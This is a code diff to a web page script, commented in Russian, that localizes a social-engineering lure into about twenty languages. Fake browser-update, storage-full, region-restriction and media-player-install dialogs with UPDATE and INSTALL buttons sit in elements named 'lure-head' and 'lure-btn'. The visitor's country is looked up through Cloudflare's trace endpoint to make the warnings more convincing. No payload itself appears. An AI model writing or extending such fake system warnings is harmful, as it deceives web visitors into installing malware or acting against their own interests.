@@ -80,48 +80,163 @@
           return "Browser";
       };
 
-      // --- БЕЗОПАСНОЕ ОПРЕДЕЛЕНИЕ СТРАНЫ ЧЕРЕЗ CLOUDFLARE ---
       const fetchCountryName = async (targetLang) => {
           try {
-              // Если ГЕО уже есть в ссылке - не мучаем сеть
               const manual = sp.get('geo') || sp.get('country');
               if (manual) return manual;
-
-              // Запрос на технический эндпоинт Cloudflare (есть на каждом домене под CF)
               const response = await fetch('/cdn-cgi/trace');
               const text = await response.text();
               const locLine = text.split('\n').find(line => line.startsWith('loc='));
               const code = locLine ? locLine.split('=')[1] : null;
-
               if (code) {
-                  // Магия: превращаем RU в "Россия" на языке юзера
                   const displayNames = new Intl.DisplayNames([targetLang], { type: 'region' });
                   return displayNames.of(code);
               }
               return null;
-          } catch (e) {
-              return null;
-          }
+          } catch (e) { return null; }
       };
 
+      // --- ПОЛНЫЙ ПАК ЯЗЫКОВ (I18N) ---
       const MODAL_I18N = {
         en: {
-          title: "Leaving already? 😢",
-          desc: "Wait—video is almost loaded.",
-          stay: "Stay", leave: "Leave",
+          title: "Leaving already? 😢", desc: "Wait—video is almost loaded.", stay: "Stay", leave: "Leave",
           t1: { h: "{browser} Update Required", t: "Your version of {browser} is no longer supported. Please update your browser to play this video.", b: "UPDATE", c: "CANCEL" },
           t2: { h: "Storage limit reached", t: "To continue playback, please clear your {browser} cache or system junk files.", b: "CLEAR NOW", c: "CANCEL" },
           t3: { h: "Content restricted", t: "This media is restricted in {country}. Please enable secure connection to watch.", b: "ENABLE", c: "CANCEL" },
           t4: { h: "Playback Error", t: "A newer version of the media player is required to play this content.", b: "INSTALL", c: "CANCEL" }
         },
+        es: {
+          title: "¿Ya te vas? 😢", desc: "Espera: el video casi se ha cargado.", stay: "Quedarme", leave: "Salir",
+          t1: { h: "Actualización necesaria", t: "Tu versión de {browser} ya no es compatible. Actualiza tu navegador para reproducir este video.", b: "ACTUALIZAR", c: "CANCELAR" },
+          t2: { h: "Memoria llena", t: "Para continuar, borra la caché de {browser} o los archivos basura del sistema.", b: "LIMPIAR", c: "CANCELAR" },
+          t3: { h: "Contenido restringido", t: "Este medio está restringido en {country}. Habilita la conexión segura para ver.", b: "HABILITAR", c: "CANCELAR" },
+          t4: { h: "Error de reproducción", t: "Se requiere una versión más reciente del reproductor multimedia.", b: "INSTALAR", c: "CANCELAR" }
+        },
+        pt: {
+          title: "Já vai embora? 😢", desc: "Espera — o vídeo quase carregou.", stay: "Ficar", leave: "Sair",
+          t1: { h: "Atualização necessária", t: "Sua versão do {browser} não é mais suportada. Atualize seu navegador para assistir.", b: "ATUALIZAR", c: "CANCELAR" },
+          t2: { h: "Limite de armazenamento", t: "Para continuar, limpe o cache do {browser} ou arquivos inúteis do sistema.", b: "LIMPAR", c: "CANCELAR" },
+          t3: { h: "Conteúdo restrito", t: "Este conteúdo é restrito em: {country}. Ative a conexão segura para assistir.", b: "ATIVAR", c: "CANCELAR" },
+          t4: { h: "Erro de reprodução", t: "Uma versão mais recente do player é necessária para reproduzir este conteúdo.", b: "INSTALAR", c: "CANCELAR" }
+        },
         ru: {
-          title: "Уже уходишь? 😢",
-          desc: "Подожди! Видео почти загрузилось.",
-          stay: "Остаться", leave: "Уйти",
-          t1: { h: "Обновите {browser}", t: "Ваша версия {browser} больше не поддерживается. Обновите браузер для просмотра видео.", b: "ОБНОВИТЬ", c: "ОТМЕНА" },
+          title: "Уже уходишь? 😢", desc: "Подожди! Видео почти загрузилось.", stay: "Остаться", leave: "Уйти",
+          t1: { h: "Обновите {browser}", t: "Ваша версия {browser} больше не поддерживается. Обновите браузер для просмотра.", b: "ОБНОВИТЬ", c: "ОТМЕНА" },
           t2: { h: "Память переполнена", t: "Для продолжения очистите кэш {browser} или системный мусор.", b: "ОЧИСТИТЬ", c: "ОТМЕНА" },
           t3: { h: "Доступ ограничен", t: "Этот контент недоступен в регионе {country}. Включите безопасное соединение.", b: "ВКЛЮЧИТЬ", c: "ОТМЕНА" },
           t4: { h: "Ошибка декодирования", t: "Для воспроизведения этого контента требуется обновить медиа-компоненты.", b: "УСТАНОВИТЬ", c: "ОТМЕНА" }
+        },
+        uk: {
+          title: "Вже йдеш? 😢", desc: "Зачекай! Відео майже завантажилось.", stay: "Залишитись", leave: "Вийти",
+          t1: { h: "Оновіть {browser}", t: "Ваша версія {browser} застаріла. Оновіть браузер для перегляду.", b: "ОНОВИТИ", c: "СКАСУВАТИ" },
+          t2: { h: "Пам'ять переповнена", t: "Для продовження очистіть кеш {browser} або системне сміття.", b: "ОЧИСТИТИ", c: "СКАСУВАТИ" },
+          t3: { h: "Доступ обмежено", t: "Цей контент недоступний у регіоні {country}. Увімкніть безпечне з'єднання.", b: "УВІМКНУТИ", c: "СКАСУВАТИ" },
+          t4: { h: "Помилка відтворення", t: "Для відтворення потрібно оновити медіа-компоненти.", b: "ВСТАНОВИТИ", c: "СКАСУВАТИ" }
+        },
+        de: {
+          title: "Gehst du schon? 😢", desc: "Warte — das Video ist fast geladen.", stay: "Bleiben", leave: "Verlassen",
+          t1: { h: "{browser}-Update erforderlich", t: "Ihre Version von {browser} wird nicht mehr unterstützt. Bitte aktualisieren Sie Ihren Browser.", b: "AKTUALISIEREN", c: "ABBRECHEN" },
+          t2: { h: "Speicher voll", t: "Bitte leeren Sie Ihren {browser}-Cache oder Systemdateien, um fortzufahren.", b: "BEREINIGEN", c: "ABBRECHEN" },
+          t3: { h: "Inhalt eingeschränkt", t: "Dieser Inhalt ist in {country} nicht verfügbar. Aktivieren Sie eine sichere Verbindung.", b: "AKTIVIEREN", c: "ABBRECHEN" },
+          t4: { h: "Wiedergabefehler", t: "Eine neuere Version des Media Players ist erforderlich.", b: "INSTALLIEREN", c: "ABBRECHEN" }
+        },
+        fr: {
+          title: "Tu pars déjà ? 😢", desc: "Attends — la vidéo est presque chargée.", stay: "Rester", leave: "Quitter",
+          t1: { h: "Mise à jour requise", t: "Votre version de {browser} n'est plus supportée. Mettez à jour votre navigateur.", b: "METTRE À JOUR", c: "ANNULER" },
+          t2: { h: "Mémoire saturée", t: "Pour continuer, videz le cache de {browser} ou les fichiers inutiles.", b: "NETTOYER", c: "ANNULER" },
+          t3: { h: "Contenu restreint", t: "Ce contenu est restreint en : {country}. Activez la connexion sécurisée.", b: "ACTIVER", c: "ANNULER" },
+          t4: { h: "Erreur de lecture", t: "Une version plus récente du lecteur est requise.", b: "INSTALLER", c: "ANNULER" }
+        },
+        it: {
+          title: "Vai già via? 😢", desc: "Aspetta — il video è quasi caricato.", stay: "Resta", leave: "Esci",
+          t1: { h: "Aggiornamento richiesto", t: "La tua versione di {browser} non è più supportata. Aggiorna il browser.", b: "AGGIORNA", c: "ANNULLA" },
+          t2: { h: "Memoria piena", t: "Per continuare, svuota la cache di {browser} o i file inutili.", b: "PULISCI", c: "ANNULLA" },
+          t3: { h: "Contenuto limitato", t: "Questo contenuto è limitato in: {country}. Attiva la connessione sicura.", b: "ATTIVA", c: "ANNULLA" },
+          t4: { h: "Errore di riproduzione", t: "È necessaria una versione più recente del lettore.", b: "INSTALLA", c: "ANNULLA" }
+        },
+        tr: {
+          title: "Şimdiden gidiyor musun? 😢", desc: "Bekle — video neredeyse yüklendi.", stay: "Kal", leave: "Çık",
+          t1: { h: "{browser} Güncellemesi", t: "{browser} sürümünüz artık desteklenmiyor. Videoyu izlemek için tarayıcınızı güncelleyin.", b: "GÜNCELLE", c: "İPTAL" },
+          t2: { h: "Depolama dolu", t: "Devam etmek için {browser} önbelleğini veya gereksiz dosyaları temizleyin.", b: "TEMİZLE", c: "İPTAL" },
+          t3: { h: "İçerik kısıtlandı", t: "Bu içerik {country} bölgesinde kısıtlıdır. İzlemek için güvenli bağlantıyı açın.", b: "AÇ", c: "İPTAL" },
+          t4: { h: "Oynatma Hatası", t: "Bu içeriği oynatmak için medya oynatıcının güncellenmesi gerekiyor.", b: "YÜKLE", c: "İPTAL" }
+        },
+        pl: {
+          title: "Już wychodzisz? 😢", desc: "Poczekaj — wideo prawie się załadowało.", stay: "Zostań", leave: "Wyjdź",
+          t1: { h: "Wymagana aktualizacja", t: "Twoja wersja {browser} nie jest obsługiwana. Zaktualizuj przeglądarkę.", b: "AKTUALIZUJ", c: "ANULUJ" },
+          t2: { h: "Pamięć pełna", t: "Aby kontynuować, wyczyść pamięć podręczną {browser} lub pliki śmieci.", b: "CZYŚĆ TERAZ", c: "ANULUJ" },
+          t3: { h: "Treść ograniczona", t: "Te media są ograniczone w: {country}. Włącz bezpieczne połączenie.", b: "WŁĄCZ", c: "ANULUJ" },
+          t4: { h: "Błąd odtwarzania", t: "Wymagana jest nowsza wersja odtwarzacza multimedialnego.", b: "INSTALUJ", c: "ANULUJ" }
+        },
+        ro: {
+          title: "Pleci deja? 😢", desc: "Așteaptă — videoclipul aproape s-a încărcat.", stay: "Rămân", leave: "Ies",
+          t1: { h: "Actualizare necesară", t: "Versiunea ta de {browser} nu mai este suportată. Actualizează browserul.", b: "ACTUALIZARE", c: "ANULARE" },
+          t2: { h: "Memorie plină", t: "Pentru a continua, șterge cache-ul {browser} sau fișierele inutile.", b: "CURĂȚĂ", c: "ANULARE" },
+          t3: { h: "Conținut restricționat", t: "Acest conținut este restricționat în {country}. Activează conexiunea sigură.", b: "ACTIVARE", c: "ANULARE" },
+          t4: { h: "Eroare redare", t: "Este necesară o versiune mai nouă a playerului media.", b: "INSTALARE", c: "ANULARE" }
+        },
+        hu: {
+          title: "Már mész? 😢", desc: "Várj — a videó majdnem betöltött.", stay: "Maradok", leave: "Kilépek",
+          t1: { h: "Frissítés szükséges", t: "A {browser} verziója elavult. Frissítse a böngészőt a videó megtekintéséhez.", b: "FRISSÍTÉS", c: "MÉGSE" },
+          t2: { h: "Megtelt a memória", t: "A folytatáshoz törölje a {browser} gyorsítótárát vagy a felesleges fájlokat.", b: "TISZTÍTÁS", c: "MÉGSE" },
+          t3: { h: "Korlátozott tartalom", t: "Ez a tartalom korlátozott itt: {country}. Engedélyezze a biztonságos kapcsolatot.", b: "ENGEDÉLYEZÉS", c: "MÉGSE" },
+          t4: { h: "Lejátszási hiba", t: "A tartalom lejátszásához frissebb médialejátszó szükséges.", b: "TELEPÍTÉS", c: "MÉGSE" }
+        },
+        cs: {
+          title: "Už odcházíš? 😢", desc: "Počkej — video je téměř načtené.", stay: "Zůstat", leave: "Odejít",
+          t1: { h: "Vyžadována aktualizace", t: "Vaše verze {browser} již není podporována. Aktualizujte prohlížeč.", b: "AKTUALIZOVAT", c: "ZRUŠIT" },
+          t2: { h: "Plná paměť", t: "Pro pokračování vymažte mezipaměť {browser} nebo nepotřebné soubory.", b: "VYČISTIT", c: "ZRUŠIT" },
+          t3: { h: "Omezený obsah", t: "Tento obsah je v {country} omezen. Povolte zabezpečené připojení.", b: "POVOLIT", c: "ZRUŠIT" },
+          t4: { h: "Chyba přehrávání", t: "K přehrání je vyžadována novější verze přehrávače.", b: "INSTALOVAT", c: "ZRUŠIT" }
+        },
+        id: {
+          title: "Sudah mau pergi? 😢", desc: "Tunggu — video hampir siap.", stay: "Tetap", leave: "Keluar",
+          t1: { h: "Pembaruan Diperlukan", t: "Versi {browser} Anda tidak lagi didukung. Perbarui browser untuk memutar video.", b: "PERBARUI", c: "BATAL" },
+          t2: { h: "Penyimpanan Penuh", t: "Untuk melanjutkan, bersihkan cache {browser} atau file sampah sistem.", b: "BERSIHKAN", c: "BATAL" },
+          t3: { h: "Konten Dibatasi", t: "Media ini dibatasi di {country}. Aktifkan koneksi aman untuk menonton.", b: "AKTIFKAN", c: "BATAL" },
+          t4: { h: "Kesalahan Pemutaran", t: "Versi pemutar media yang lebih baru diperlukan untuk memutar konten ini.", b: "INSTAL", c: "BATAL" }
+        },
+        th: {
+          title: "จะไปแล้วเหรอ? 😢", desc: "รอก่อน! วิดีโอใกล้โหลดเสร็จแล้ว", stay: "อยู่ต่อ", leave: "ออก",
+          t1: { h: "จำเป็นต้องอัปเดต", t: "{browser} ของคุณไม่รองรับอีกต่อไป โปรดอัปเดตเบราว์เซอร์เพื่อเล่นวิดีโอ", b: "อัปเดต", c: "ยกเลิก" },
+          t2: { h: "หน่วยความจำเต็ม", t: "เพื่อดำเนินการต่อ โปรดล้างแคช {browser} หรือไฟล์ขยะในระบบ", b: "ล้างทันที", c: "ยกเลิก" },
+          t3: { h: "เนื้อหาถูกจำกัด", t: "สื่อนี้ถูกจำกัดใน {country} โปรดเปิดใช้งานการเชื่อมต่อที่ปลอดภัย", b: "เปิดใช้งาน", c: "ยกเลิก" },
+          t4: { h: "ข้อผิดพลาดการเล่น", t: "จำเป็นต้องใช้โปรแกรมเล่นสื่อเวอร์ชันใหม่กว่าเพื่อเล่นเนื้อหานี้", b: "ติดตั้ง", c: "ยกเลิก" }
+        },
+        vi: {
+          title: "Bạn rời đi rồi sao? 😢", desc: "Đợi chút — video gần tải xong.", stay: "Ở lại", leave: "Rời đi",
+          t1: { h: "Cần cập nhật", t: "Phiên bản {browser} của bạn không còn được hỗ trợ. Vui lòng cập nhật trình duyệt.", b: "CẬP NHẬT", c: "HỦY" },
+          t2: { h: "Bộ nhớ đầy", t: "Để tiếp tục, vui lòng xóa bộ nhớ đệm {browser} hoặc các tập tin rác.", b: "DỌN DẸP", c: "HỦY" },
+          t3: { h: "Nội dung bị hạn chế", t: "Nội dung này bị hạn chế tại {country}. Vui lòng bật kết nối an toàn.", b: "BẬT", c: "HỦY" },
+          t4: { h: "Lỗi phát lại", t: "Cần có phiên bản trình phát đa phương tiện mới hơn để phát nội dung này.", b: "CÀI ĐẶT", c: "HỦY" }
+        },
+        ms: {
+          title: "Nak pergi sekarang? 😢", desc: "Tunggu — video hampir siap.", stay: "Tunggu", leave: "Keluar",
+          t1: { h: "Kemas Kini Diperlukan", t: "Versi {browser} anda tidak lagi disokong. Sila kemas kini pelayar.", b: "KEMAS KINI", c: "BATAL" },
+          t2: { h: "Storan Penuh", t: "Untuk meneruskan, sila bersihkan cache {browser} atau fail sampah.", b: "BERSIHKAN", c: "BATAL" },
+          t3: { h: "Kandungan Disekat", t: "Media ini disekat di {country}. Sila dayakan sambungan selamat.", b: "DAYAKAN", c: "BATAL" },
+          t4: { h: "Ralat Main Semula", t: "Versi pemain media yang lebih baharu diperlukan.", b: "PASANG", c: "BATAL" }
+        },
+        hi: {
+          title: "अभी जा रहे हो? 😢", desc: "रुको — वीडियो लगभग लोड हो गया है।", stay: "रुको", leave: "जाओ",
+          t1: { h: "अपडेट आवश्यक है", t: "आपका {browser} संस्करण अब समर्थित नहीं है। वीडियो चलाने के लिए ब्राउज़र अपडेट करें।", b: "अपडेट करें", c: "रद्द करें" },
+          t2: { h: "मेमोरी फुल है", t: "जारी रखने के लिए, कृपया {browser} कैश या जंक फ़ाइलें साफ़ करें।", b: "साफ़ करें", c: "रद्द करें" },
+          t3: { h: "सामग्री प्रतिबंधित", t: "यह मीडिया {country} में प्रतिबंधित है। देखने के लिए सुरक्षित कनेक्शन सक्षम करें।", b: "सक्षम करें", c: "रद्द करें" },
+          t4: { h: "प्लेबैक त्रुटि", t: "इस सामग्री को चलाने के लिए मीडिया प्लेयर का नया संस्करण आवश्यक है।", b: "इंस्टॉल करें", c: "रद्द करें" }
+        },
+        ar: {
+          title: "هل ستغادر الآن؟ 😢", desc: "انتظر — الفيديو أوشك على التحميل.", stay: "البقاء", leave: "مغادرة",
+          t1: { h: "التحديث مطلوب", t: "إصدار {browser} الخاص بك لم يعد مدعومًا. يرجى تحديث المتصفح لتشغيل الفيديو.", b: "تحديث", c: "إلغاء" },
+          t2: { h: "الذاكرة ممتلئة", t: "للمتابعة، يرجى مسح ذاكرة التخزين المؤقت لـ {browser} أو ملفات النظام غير الضرورية.", b: "تنظيف الآن", c: "إلغاء" },
+          t3: { h: "المحتوى مقيد", t: "هذا المحتوى مقيد في {country}. يرجى تمكين الاتصال الآمن للمشاهدة.", b: "تمكين", c: "إلغاء" },
+          t4: { h: "خطأ في التشغيل", t: "مطلوب إصدار أحدث من مشغل الوسائط لتشغيل هذا المحتوى.", b: "تثبيت", c: "إلغاء" }
+        },
+        bn: {
+          title: "এখনই চলে যাচ্ছো? 😢", desc: "একটু অপেক্ষা করো — ভিডিও প্রায় লোড হয়ে গেছে।", stay: "থাকি", leave: "চলে যাই",
+          t1: { h: "আপডেট প্রয়োজন", t: "আপনার {browser} সংস্করণটি আর সমর্থিত নয়। ভিডিও চালাতে ব্রাউজার আপডেট করুন।", b: "আপডেট করুন", c: "বাতিল" },
+          t2: { h: "মেমরি পূর্ণ", t: "চালিয়ে যেতে, দয়া করে {browser} ক্যাশ বা আবর্জনা ফাইল পরিষ্কার করুন।", b: "পরিষ্কার করুন", c: "বাতিল" },
+          t3: { h: "বিষয়বস্তু সীমাবদ্ধ", t: "এই মিডিয়া {country}-এ সীমাবদ্ধ। দেখতে নিরাপদ সংযোগ চালু করুন।", b: "চালু করুন", c: "বাতিল" },
+          t4: { h: "প্লেব্যাক ত্রুটি", t: "এই বিষয়বস্তু চালানোর জন্য মিডিয়া প্লেয়ারের নতুন সংস্করণ প্রয়োজন।", b: "ইনস্টল করুন", c: "বাতিল" }
         }
       };
 
@@ -144,10 +259,19 @@
         const textHead = content.h.replace(/{browser}/g, browser);
         const textBody = content.t.replace(/{browser}/g, browser).replace(/{country}/g, finalCountry);
 
+        const elDialog = document.querySelector('.system-dialog');
         const elHead = document.getElementById('lure-head');
         const elText = document.getElementById('lure-text');
         const elBtn  = document.getElementById('lure-btn');
         const elCancel = document.getElementById('lure-cancel');
+
+        // RTL SUPPORT FOR ARABIC
+        if (langCode === 'ar' && elDialog) {
+            elDialog.style.direction = 'rtl';
+            elDialog.style.textAlign = 'right';
+            const actions = elDialog.querySelector('.dialog-actions');
+            if (actions) actions.style.justifyContent = 'flex-start';
+        }
 
         if (elHead) elHead.innerText = textHead;
         if (elText) elText.innerText = textBody;
